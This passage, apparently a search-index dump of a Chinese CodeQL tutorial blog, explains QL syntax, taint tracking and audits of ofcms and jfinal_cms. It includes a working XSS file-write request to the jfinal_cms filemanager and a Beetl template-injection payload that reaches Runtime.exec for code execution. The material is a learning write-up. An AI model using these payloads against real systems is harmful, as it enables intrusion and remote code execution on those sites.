extends ClassInstanceExpr { SinkFile(){ this.getConstructor().getDeclaringType*().hasQualifiedName(\"java.io\",\"File\" ) } } \u6a21\u677f\u6e32\u67d3\u7c7b \u4e5f\u53ef\u4ee5\u4ee5\u6a21\u677f\u6ce8\u5165\u4e3a\u601d\u8003\u7684\u5bf9\u8c61\uff0c\u5c06\u6e32\u67d3\u76f8\u5173\u65b9\u6cd5\u7684\u53c2\u6570\u8bbe\u4e3asink com.jfinal.core.Controller\u4e2d\u5b9a\u4e49\u4e86\u8fd9\u4e9b\u6e32\u67d3\u65b9\u6cd5 class SinkRender extends MethodAccess{ SinkRender(){ this.getMethod().getDeclaringType*().hasQualifiedName(\"com.jfinal.core\", \"Controller\") and this.getMethod().getName().substring(0, 6)=\"render\" } } \u641e\u4e86\u4e0a\u9762\u51e0\u4e2asink\uff0c\u6211\u5c31\u611f\u53d7\u5230\u4e86\u4e00\u4e9b\u56f0\u60d1\uff1a 1.\u5982\u4f55\u5feb\u901f\u5224\u65ad\u76ee\u6807\u9879\u76ee\u7528\u4e86\u54ea\u4e9b\u4f9d\u8d56\uff1f 2.\u5982\u4f55\u5feb\u901f\u627e\u5230\u76ee\u6807\u9879\u76ee\u7684sink\u70b9\uff1f \u5bf9\u4e8e\u95ee\u98981\uff0c\u6211\u76ee\u524d\u60f3\u5230\u6700\u597d\u7684\u65b9\u6cd5\u5c31\u662f\u770bpom.xml \u5bf9\u4e8e\u95ee\u98982\uff0c\u6211\u76ee\u524d\u60f3\u5230\u7684\u65b9\u6848\u662f\u770b\u770bcodeql\u81ea\u5e26\u7684ql\u6587\u4ef6\u4e2d\u662f\u5982\u4f55\u5b9a\u4e49ql\uff0c\u53bb\u8fd9\u91cc\u9762\u627e\u627e\u7075\u611f jfinal_cms \u5ba1\u8ba1 \u67d0\u79cd\u610f\u4e49\u4e0a\u7684\u7b2c\u4e00\u6b21\u5ba1\u8ba1 \u521d\u6b21\u5c1d\u8bd5 jfinal_cms\u4e5f\u662f\u57fa\u4e8ejfinal\u7684\uff0c\u8fd9\u7ed9\u6211\u4eecsource\u7684\u5b9a\u4e49\u63d0\u4f9b\u4e86\u4fbf\u5229\uff0c\u76f4\u63a5\u7167\u6284\u5fae\u6539\u4e00\u4e0b\u4e0a\u4e00\u5c0f\u8282ofcms\u7684source class ControllerSource extends MethodAccess{ ControllerSource(){ this.getMethod().getDeclaringType*().hasQualifiedName(\"com.jfinal.core\", \"Controller\") and this.getMethod().getName().substring(0, 3)=\"get\" } } sink\uff0c\u5148\u6765\u6307\u5b9anew File abstract class Sink extends Top{ abstract Expr getInput(); } class FileConstructorSink extends ClassInstanceExpr,Sink{ FileConstructorSink(){ //this.getConstructor().getDeclaringType*().getASupertype*().hasQualifiedName(\"java.io\",\"File\") or this.getConstructor().getDeclaringType*().getASupertype*().hasQualifiedName(\"java.io\",\"Writer\") or this.getConstructor().getDeclaringType*().getASupertype*().hasQualifiedName(\"java.io\",\"Reader\") or this.getConstructor().getDeclaringType*().getASupertype*().hasQualifiedName(\"java.io\",\"FileInputStream\") } override Expr getInput(){ result=this.getAnArgument() } } \u626b\u51fa\u6765\u4e09\u4e2a\uff0c\u90fd\u4e0d\u80fd\u6253\u3002\u770b\u770b\u5176\u5b83\u76ee\u6807\u5427 \u6307\u5b9arender class RenderSink extends Sink,MethodAccess{ RenderSink(){ this.getMethod().getDeclaringType*().hasQualifiedName(\"com.jfinal.core\", \"Controller\") and this.getMethod().getName().substring(0, 6)=\"render\" } override Expr getInput(){ result=this.getAnArgument() } } \u540c\u6837 \u4e5f\u6ca1\u6709\u4ec0\u4e48\u6536\u83b7\uff0c\u76f4\u5230\u6211\u6dfb\u52a0\u4e86\u4e0b\u9762\u7684\u8fd9\u4e24\u4e2aAdditionalTaintStep class TaintFix1 extends TaintTracking::AdditionalTaintStep{ override predicate step(DataFlow::Node node1, DataFlow::Node node2) { exists(EnhancedForStmt fs | node1.asExpr()=fs.getExpr() and node2.asExpr()=fs.getVariable() ) } } class TaintFix2 extends TaintTracking::AdditionalTaintStep{ override predicate step(DataFlow::Node node1, DataFlow::Node node2) { exists(MethodAccess ma | node1.asExpr()=ma.getQualifier() and node2.asExpr()=ma ) } } 16\u4e2a\u7ed3\u679c\uff0c\u6bcf\u4e2a\u7ed3\u679c\u90fd\u5f88\u957f\uff0c\u6162\u6162\u770b\u3002\u6700\u540e\u53ea\u627e\u5230\u4e86\u4e0b\u9762\u4e24\u4e2a\u80fd\u6253\u7684 XSS url: http://localhost:8080/jfinal_cms/admin/filemanager post:content=\\ alert(1)\\ \\&mode=savefile\\&path=template/bbs/message/show_message.html \u7b80\u5355\u8bb2\u4e00\u4e0bpost\u91cc\u9762\u53c2\u6570\u7684\u610f\u4e49\uff0cmode\u8bbe\u7f6e\u4e3asavefile\u4e14post\u53d1\u5305\uff0c\u5c31\u4f1a\u8fdb\u5165savefile\u65b9\u6cd5 \u7136\u540e\u5c31\u4f1a\u4ee5\u5c06path\u7684\u503c\u62fc\u63a5\u5728\u7f51\u9875\u6839\u76ee\u5f55\u540e\u9762\uff0c\u8fd9\u6837\u83b7\u5f97\u4e00\u4e2a\u7edd\u5bf9\u8def\u5f84\uff0c\u7136\u540e\u518d\u5c06content\u91cc\u7684\u5185\u5bb9\u5199\u5165\u5230\u8fd9\u4e2a\u7edd\u5bf9\u8def\u5f84\u6307\u5b9a\u7684\u6587\u4ef6\u4e2d\u3002 \u6211\u4eec\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5c06xss payload\u5199\u5165\u9759\u6001html\u6587\u4ef6\uff0c\u9020\u6210xss\u653b\u51fb \u4f46\u8bf4\u5b9e\u8bdd\u3002\u6ca1\u5565\u5375\u7528\u3002 **\u4e00\u4e9b\u56f0\u96be ** \u8fd9\u4e2a\u6d1e\u7684path\u53c2\u6570\u6709\u4e00\u4e2awaf \u6211\u8fd8\u6ca1\u60f3\u51fa\u600e\u4e48\u7ed5\u6210\u76ee\u5f55\u7a7f\u8d8a\uff0c\u5982\u679c\u80fd\u7ed5\u51fa\u76ee\u5f55\u7a7f\u8d8a\u5c31\u662f\u4efb\u610f\u6587\u4ef6\u5199\u4e86 \u4eceXSS\u5230RCE \u6211\u4eec\u521a\u521a\u63d0\u5230\uff0c\u53ef\u4ee5\u5bf9\u6a21\u677f\u6587\u4ef6\u4efb\u610f\u5199\u5165\u5185\u5bb9\u561b\u3002 \u5728\u6b64\u4e4b\u524d\u6211\u4e00\u76f4\u4ee5\u4e3a\u4f5c\u7528\u4ec5\u9650\u4e8eXSS\u4e86\uff0c\u4f46\u662f\u8f6c\u5ff5\u4e00\u60f3\uff0c\u65e2\u7136\u63a7\u5236\u6a21\u677f\u6587\u4ef6\u4e86\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6a21\u677f\u6ce8\u5165\u4e86\u554a\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u8c03\u7528Runtime.getRuntime().exec()\u554a\u3002 \u53c2\u8003\u81ea\uff1a https://i.hacking8.com/page/21674 jfinal_cms\u6a21\u677f\u5f15\u64ce\u7528\u7684beetl\uff0cbeetl\u9ed8\u8ba4\u7981\u7528 java.lang.Runtime \u548c java.lang.Proces \uff0c\u6240\u4ee5\u8981\u7ed5\u8fc7\u4e00\u4e0b content=${@java.lang.Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", @java.lang.Class.forName(\"java.lang.String\")).invoke( @java.lang.Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null),\"calc\")}&mode=savefile&path=template/bbs/message/show_message.html \u7136\u540e\uff0c\u6316\u4e0d\u52a8\u4e86\uff0c\u8fd9\u4e2acms\u7528codeql\u8dd1\u4e86\u8bb8\u591a\u6b21\u90fd\u6ca1\u6709\u80fd\u6253\u7684\uff0c\u6211\u592a\u83dc\u4e86\u3002","title":"Codeql \u5165\u95e8\u5b66\u4e60"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#codeql","text":"","title":"Codeql \u5165\u95e8\u5b66\u4e60"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_1","text":"\u4f55\u4e3aCodeql\uff1f source\uff0csink\uff0csanitizer \u4e09\u5143\u7ec4 SDK \u73af\u5883\u642d\u5efa\u4e0e\u542f\u52a8 \u57fa\u672c\u8bed\u6cd5\u3001\u6982\u5ff5 \u57fa\u672c\u67e5\u8be2\u7ed3\u6784 metadata import statements classes and predicates from where select \u67e5\u8be2 \u6570\u636e\u6d41\u5206\u6790 Path queries \u5f15\u5165\u6a21\u5757 \u6307\u5b9asource\u3001sink \u9009\u62e9\u8282\u70b9 Codeql-java java\u5e93 \u5143\u7d20Element [Type\uff08\u7c7b\u578b\uff09 ](#Type\u7c7b\u578b) - Generics\uff08\u6cdb\u578b\uff09 - Variables\uff08\u53d8\u91cf\uff09 - \u62bd\u8c61\u8bed\u6cd5\u6811 ast - \u5143\u6570\u636e metadata - \u6307\u6807Metrics - \u8c03\u7528\u5173\u7cfbCall Gragh - java\u6570\u636e\u6d41\u5206\u6790 - \u5c40\u90e8\u6570\u636e\u6d41Local data flow - \u4f7f\u7528\u5c40\u90e8\u6570\u636e\u6d41 - \u5c40\u90e8\u6c61\u70b9\u8ffd\u8e2alocal taint tracking - \u5168\u5c40\u6570\u636e\u6d41Global data flow - \u5168\u5c40\u6c61\u70b9\u8ffd\u8e2aglobal taint tracking - \u6570\u636e\u6e90 - java\u4e2d\u7684Type - Codeql \u5b9e\u64cd - codeql lab java - 1.1 :Sources - 1.2 :sink - 1.3: TaintTracking configuration - 1.4: Partial Flow to the rescue - 1.5: Adding additional taint steps - 1.6&1.7: Adding additional taint steps\\&Adding taint steps through a constructor - 1.8\uff1aFinish line for our first issue - 3: Errors and Exceptions - ofcms\u5ba1\u8ba1\u8bd5\u6c34 - \u6587\u4ef6\u7c7b - \u6a21\u677f\u6e32\u67d3\u7c7b - jfinal_cms \u5ba1\u8ba1 - \u521d\u6b21\u5c1d\u8bd5 - XSS - \u4eceXSS\u5230RCE","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#codeql_1","text":"\u7b80\u800c\u8a00\u4e4b\uff0cCodeql\u662fgithub\u53d1\u5e03\u7684\u7528\u6765\u5206\u6790\u4ee3\u7801\u7684\u4e00\u4e2a\u95ed\u6e90\u5de5\u5177\uff0c\u5b83\u901a\u8fc7\u5c06\u4ee3\u7801\u8f6c\u6362\u4e3a\u7279\u5b9a\u7684\u6570\u636e\u5e93\u5f62\u5f0f\u8fdb\u884c\u5206\u6790\uff0c\u5e76\u4e14\u7528ql\u8bed\u8a00\u5bf9\u5176\u8fdb\u884c\u67e5\u8be2\u64cd\u4f5c\u3002 \u6bd4\u5982\u4e0b\u9762\u7684\u51e0\u6392\u4ee3\u7801\u5c31\u662f\u67e5\u8be2\u4ee3\u7801\u4e2d\u6240\u6709\u65b9\u6cd5 import java from Method method select method \u4e0b\u56fe\u4fbf\u662f\u4e0a\u9762\u4ee3\u7801\u67e5\u8be2\u5f97\u5230\u7684\u7ed3\u679c codeql\u5f88\u5f3a\u5927\uff0c\u5b83\u652f\u6301\u5982\u4e0b\u8bed\u8a00\u7684\u4ee3\u7801\u5206\u6790","title":"\u4f55\u4e3aCodeql\uff1f"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#sourcesinksanitizer","text":"source\uff0csink\uff0csanitizer \u8fd9\u4e09\u4e2a\u6982\u5ff5\u662f\u4ee3\u7801\u81ea\u52a8\u5316\u5ba1\u8ba1\u4e2d\u5f88\u91cd\u8981\u7684\u4e00\u4e2a\u6982\u5ff5\u3002codeql\u67e5\u627e\u5b89\u5168\u6f0f\u6d1e\u7684\u539f\u7406\u4fbf\u662f\u901a\u8fc7\u8fd9\u4e09\u4e2a\u4e1c\u897f\u5c55\u5f00\u7684\u3002 source\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u6761\u6f0f\u6d1e\u94fe\u7684\u5f00\u59cb\u70b9\uff0c\u6bd4\u5982\u83b7\u53d6http\u8bf7\u6c42\u4e2d\u7684\u53c2\u6570\uff0c\u5c31\u662f\u4e00\u4e2a\u5178\u578b\u7684source\uff0c\u5982\u4e0b\u56fe\u3002 sink\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u6761\u6f0f\u6d1e\u94fe\u7684\u7ed3\u675f\u70b9\uff0c\u5f80\u5f80\u662f\u4e00\u4e9b\u5371\u9669\u51fd\u6570\u88ab\u53ef\u63a7\u53c2\u6570\u6240\u89e6\u53d1\uff0c\u5982\u53ef\u63a7\u53c2\u6570\u88ab\u4f20\u5165\u6267\u884csql\u8bed\u53e5\uff0c\u4f20\u5165\u4e86eval\u65b9\u6cd5\u7b49\uff0c\u5982\u4e0b\u56fe\u5c31\u662f\u4e00\u4e2a\u5178\u578b\u7684sink\uff08sql\u6ce8\u5165\uff09 sanitizer \u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u6761\u6f0f\u6d1e\u94fe\u4e2d\u7684\u8fc7\u6ee4\u51fd\u6570\uff0c\u7528\u4e8e\u963b\u65ad\u6f0f\u6d1e\u94fe\u4ecesource\u6210\u529f\u8d70\u5230sink \u5982\u679csource\u548csink\u540c\u65f6\u5b58\u5728\uff0c\u5e76\u4e14source\u5230sink\u662f\u901a\u7684\uff0c\u5c31\u8bf4\u660e\u6f0f\u6d1e\u5b58\u5728\u3002","title":"source\uff0csink\uff0csanitizer \u4e09\u5143\u7ec4"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#sdk","text":"codeql\u662f\u7528\u6765\u5206\u6790\u4ee3\u7801\u7684\u5de5\u5177\uff0c\u5176\u672c\u4f53\u53ea\u662f\u4e00\u4e2a\u89e3\u6790\u5f15\u64ce\uff0c\u9700\u8981\u4e3a\u5176\u63d0\u4f9b\u4e00\u7cfb\u5217\u8bed\u6cd5\u89c4\u5219\u6765\u8fdb\u884c\u5206\u6790\u3002 SDK\u5219\u662f\u8bb8\u591a\u7f16\u5199\u597d\u7684\u89c4\u5219\uff0c\u5b8c\u5168\u5f00\u6e90\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7528\u73b0\u6210\u7684SDK\u6765\u7f16\u5199\u89c4\u5219\u3002","title":"SDK"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_2","text":"\u4e00\u822c\u6765\u8bf4\uff0c\u73af\u5883\u642d\u5efa\u7684\u64cd\u4f5c\u662f \u5148\u5728github\u4e0a\u4e0b\u8f7dcodeql\u672c\u4f53\uff0c\u518d\u4e0b\u8f7dql\u8fd9\u4e2asdk\uff0c\u7136\u540e\u518d\u5b8c\u6210vscode\u7684codeql\u63d2\u4ef6\u5b89\u88c5\u3002 \u542f\u52a8codeql\u5206\u6790\u4ee3\u7801\u7684\u64cd\u4f5c\u662f \u5148\u751f\u6210\u76ee\u6807\u9879\u76ee\u6587\u4ef6\u7684\u6570\u636e\u5e93\u6587\u4ef6 \uff0c\u7136\u540e\u518d\u7528codeql\u5bf9\u5176\u8fdb\u884c\u5206\u6790\u3002 \u8fd9\u91cc\u5f15\u7528\u4e00\u4e0bfreebuf\u4e0a\u5173\u4e8ecodeql\u5206\u6790\u4ee3\u7801\u6b65\u9aa4\u7684\u4e00\u4e2a\u56fe\u7247\uff0c\u4e0d\u96be\u53d1\u73b0codeql\u662f\u57fa\u4e8e\u4ee3\u7801\u751f\u6210\u7684\u6570\u636e\u5e93\u8fdb\u884c\u5206\u6790\u7684\u3002 \u5177\u4f53\u642d\u5efa\u64cd\u4f5c\u7f51\u4e0a\u6709\u5f88\u591a\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u8d58\u8ff0\u4e86\uff0c\u73b0\u6210\u7684\u73af\u5883\u642d\u5efa\u7684\u6587\u7ae0\u5728\u8fd9\u91cc\u63a8\u8350\u51e0\u7bc7\u3002 \u751f\u6210\u6570\u636e\u5e93 codeql database create database_name -l java https://me.xxf.world/post/codeql-huan-jing-da-jian/ https://www.freebuf.com/articles/web/283795.html","title":"\u73af\u5883\u642d\u5efa\u4e0e\u542f\u52a8"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_3","text":"\u53ea\u662f\u7b80\u5355\u7684\u804a\u804a\u6982\u5ff5\uff0c\u5e76\u4e0d\u4f1a\u5f88\u6df1\u5165\u4e25\u8c28 \u7531\u4e8e\u7b14\u8005\u66f4\u6ce8\u91cd\u4e8ecodeql\u5728java\u4e2d\u7684\u4f7f\u7528\uff0c\u6240\u4ee5\u5728codeql-java\u5c0f\u8282\u4e2d\u4f1a\u6709\u66f4\u52a0\u6df1\u5165\u7684\u4e00\u4e9b\u53d9\u8ff0\u3002 ref: https://codeql.github.com/docs/writing-codeql-queries/codeql-queries/","title":"\u57fa\u672c\u8bed\u6cd5\u3001\u6982\u5ff5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_4","text":"/** * * Query metadata * */ import /* ... CodeQL libraries or modules ... */ /* ... Optional, define CodeQL classes and predicates ... */ from /* ... variable declarations ... */ where /* ... logical formula ... */ select /* ... expressions ... */","title":"\u57fa\u672c\u67e5\u8be2\u7ed3\u6784"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#metadata","text":"\u7b80\u800c\u8a00\u4e4b\uff0c\u5c31\u662f\u8fd9\u6bb5\u67e5\u8be2\u7684\u5143\u6570\u636e\uff08\u5e9f\u8bdd\uff09\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u5143\u6570\u636e\u53bb\u5b9a\u4e49\u7ed3\u679c\u7684\u5c55\u793a\u3001\u63d0\u4f9b\u67e5\u8be2\u76ee\u7684\u7684\u76f8\u5173\u4fe1\u606f\u3001\u4e3a\u8fd9\u6bb5\u67e5\u8be2\u63d0\u4f9b\u8fa8\u8bc6\u7b26 \u7b49\u3002 \u867d\u7136\u5728\u6ce8\u91ca\u4e2d\uff0c\u4f46\u662fmetadata\u4f9d\u65e7\u80fd\u591f\u5f71\u54cd\u67e5\u8be2\u672c\u8eab\u3002 metadata\u7684\u4e00\u4e9b\u952e\u503c\u7ed3\u6784 https://codeql.github.com/docs/writing-codeql-queries/metadata-for-codeql-queries/","title":"metadata"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#import-statements","text":"\u7528\u4e8e\u5f15\u5165\u4f9d\u8d56\uff08.qll\u6587\u4ef6\uff09\u548c\u6a21\u5757","title":"import statements"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#classes-and-predicates","text":"\u5b9a\u4e49\u7c7b\u7684\u8c13\u8bed","title":"classes and predicates"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#from-where-select","text":"from\u4ece\u53e5\u540e\u9762\u8ddf\u53d8\u91cf\uff08\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u96c6\u5408\uff09 \uff0c\u6bd4\u5982 from Method a \uff0c\u5c31\u662f\u83b7\u53d6\u6240\u6709\u65b9\u6cd5\uff0c\u7136\u540e\u5c06\u83b7\u53d6\u5230\u7684\u65b9\u6cd5\u7684\u96c6\u5408\u547d\u540d\u4e3aa where\u4ece\u53e5\u540e\u8ddf\u9650\u5236\u6761\u4ef6\uff08\u96c6\u5408\u3001\u8c13\u8bed\u3001\u516c\u5f0f\uff09\uff0c\u5c06\u53d8\u91cf\uff08\u96c6\u5408\uff09\u9650\u5236\u4e3a\u66f4\u5c0f\u7684\u96c6\u5408 select\u5c55\u793a\u88abwhere\u4ece\u53e5\u4fee\u9970\u8fc7\u540e\u7684\u96c6\u5408\u7684\u7ed3\u679c \u5176\u4e2d\u5173\u4e8eselect\u53ef\u4ee5\u5ef6\u4f38\u51fa \u201c\u600e\u6837\u8fd4\u56de\u7ed3\u679c\u201d\u8fd9\u4e2a\u95ee\u9898\u3002 select\u4ece\u53e5\u53ef\u4ee5\u4f20\u5165\u4e24\u79cd\u503c\uff0c\u4e00\u4e2a\u662fElement\uff08\u5982\u53d8\u91cf\uff09\uff0c\u4e00\u4e2a\u662fString\uff08\u5b57\u7b26\u4e32\uff09\u3002\u540c\u65f6\u5b57\u7b26\u4e32\u4e5f\u53ef\u4ee5\u4e0eElement\u8fdb\u884c\u62fc\u63a5\u8f93\u51fa\u3002\u5c31\u50cf\u8fd9\u6837 import java from Method a where a.getName().length()=5 select a.getLocation(),\"methodname: \"+a.getName() \u4e5f\u53ef\u4ee5\u901a\u8fc7\u5360\u4f4d\u7b26\\$@. \u8fdb\u884c\u683c\u5f0f\u5316\u8f93\u51fa. \u540c\u65f6\u5728codeql\u4e2d\u4e5f\u5b58\u5728\u7740\u4e09\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u63d0\u4f9b\u8fd4\u56de\u7ed3\u679c\u4e2d\u7684\u5143\u7d20\u7684\u4f4d\u7f6e\u3002 \u5b83\u4eec\u6309\u8c03\u7528\u7684\u4f18\u5148\u987a\u5e8f\u5206\u522b\u662f Providing URLs \uff1a\u63d0\u4f9bURL\uff0c\u5982\u679c\u662ffile://\u534f\u8bae\uff0c\u5c31\u4f1a\u540c\u65f6\u5728URL\u540e\u56de\u8ddf4\u4e2a\u6570\u5b57\uff0c\u6570\u5b57\u4e0e\u6570\u5b57\u4e4b\u95f4\u3001\u6570\u5b57\u4e0eURL\u4e4b\u95f4\u7528\u5206\u53f7\u9694\u5f00\uff0c\u6570\u5b57\u4ece\u5de6\u5411\u53f3\u4ee3\u8868 \u5143\u7d20\u5728\u6587\u4ef6\u4e2d\u7684 \u5f00\u59cb\u884c\uff1a\u5f00\u59cb\u5217\uff1a\u7ed3\u675f\u884c\uff1a\u7ed3\u675f\u5217\uff0c\u5982\uff1a file://opt/src/my/file.java:12:1:13:0 \u5176\u4e2d0:0:0:0 \u4ee3\u8868\u6574\u4e2a\u6587\u4ef6\u5185\u5bb9 1:0:1:0 \u4ee3\u8868\u7b2c\u4e00\u884c\u7684\u5185\u5bb9 \u4e0d\u52a0\u7ed3\u5c3e\u7684\u6570\u5b57\u4e5f\u4ee3\u8868\u6574\u4e2a\u6587\u4ef6\u5185\u5bb9\u3002\u8fd9\u4e2aURL\u4ece\u8c13\u8bcd\u7684getURL()\u65b9\u6cd5\u83b7\u53d6\u3002 Providing location information \uff1a\u5f53getURL\u8c13\u8bcd\u4e0d\u5b58\u5728\u65f6\uff0c\u4f1a\u8c03\u7528hasLocationInfo\u3002\u8be5\u673a\u5236\u4e0d\u4f1a\u751f\u6210getURL\u90a3\u6837\u5197\u957f\u7684URL\uff0c\u800c\u662f\u66f4\u7b80\u6d01\u7684URL\u3002(\u4e0d\u592a\u61c2 Using extracted location information \uff1a\u5f53\u4ee5\u4e0a\u4e24\u4e2a\u65b9\u6cd5\u90fd\u4e0d\u5b58\u5728\u65f6\u8c03\u7528\u8fd9\u4e2a\uff0c\u4f1a\u4ece\u6570\u636e\u5e93\u62fe\u8d77\u5df2\u6709\u7684\u4fe1\u606f","title":"from where select"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_5","text":"codeql\u6709\u4e24\u79cd\u67e5\u8be2 Alert queries : queries that highlight issues in specific locations in your code.\uff08\u67e5\u8be2\u7279\u5b9a\u7684\u67d0\u4e2a\u70b9\uff0c\u5982\u83b7\u53d6\u7279\u5b9a\u65b9\u6cd5\u540d\uff09metadata\u4e2d\u6ce8\u660e @kind problem Path queries : queries that describe the flow of information between a source and a sink in your code.\uff08\u901a\u8fc7source\u3001sink\u6765\u67e5\u627e\u4e4b\u95f4\u7684\u901a\u8def\uff09 @kind proble-path","title":"\u67e5\u8be2"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_6","text":"codeql\u5b98\u65b9\u6587\u6863\u5bf9\u6570\u636e\u6d41\u5206\u6790\u7684\u5b9a\u4e49 \"Data flow analysis is used to compute the possible values that a variable can hold at various points in a program, determining how those values propagate through the program and where they are used.\" \u6570\u636e\u6d41\u5206\u6790\u7528\u4e8e\u8ba1\u7b97\u4e00\u4e2a\u53d8\u91cf\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u6240\u6709\u6709\u53ef\u80fd\u5f97\u5230\u7684\u503c\uff0c\u5206\u6790\u8fd9\u4e9b\u503c\u662f\u5982\u4f55\u5728\u7a0b\u5e8f\u4e2d\u4f20\u64ad\u7684\uff0c\u4ee5\u53ca\u8fd9\u4e9b\u503c\u5728\u54ea\u91cc\u88ab\u7528\u5230\u8fc7\u3002 codeql\u7684\u8bb8\u591a\u67e5\u8be2\u90fd\u57fa\u4e8e\u6570\u636e\u6d41\u5206\u6790\u3002 codeql\u7684\u6570\u636e\u6d41\u5206\u6790\u662f\u57fa\u4e8e\u7a0b\u5e8f\u5efa\u6a21\u5f97\u6765\u7684\u6570\u636e\u6d41\u56fe\u7684\u3002 ** \u6570\u636e\u6d41\u56fe ** \u6570\u636e\u6d41\u56fe \u60f3\u8981\u521b\u5efa\u4e00\u4e2a\u51c6\u786e\u4e14\u5168\u9762\u7684\u6570\u636e\u6d41\u56fe\u4f1a\u9762\u4e34\u4e0b\u9762\u7684\u51e0\u4e2a\u96be\u9898 \u6709\u4e9b\u5e93\u51fd\u6570\u6e90\u7801\u662f\u95ed\u6e90\u7684\uff0c\u65e0\u6cd5\u5bf9\u6e90\u7801\u8fdb\u884c\u5efa\u6a21 \u6709\u4e9b\u884c\u4e3a\u662f\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u624d\u4f1a\u5c55\u73b0\u51fa\u6765\u7684 \u4ee3\u7801\u4e2d\u53d8\u91cf\u7684\u522b\u540d\u4f1a\u7ed9\u5206\u6790\u5e26\u6765\u56f0\u6270 \u6570\u636e\u6d41\u56fe\u751f\u6210\u4f1a\u5f88\u5927\uff0c\u8ba1\u7b97\u5206\u6790\u8d77\u6765\u901f\u5ea6\u5f88\u6162 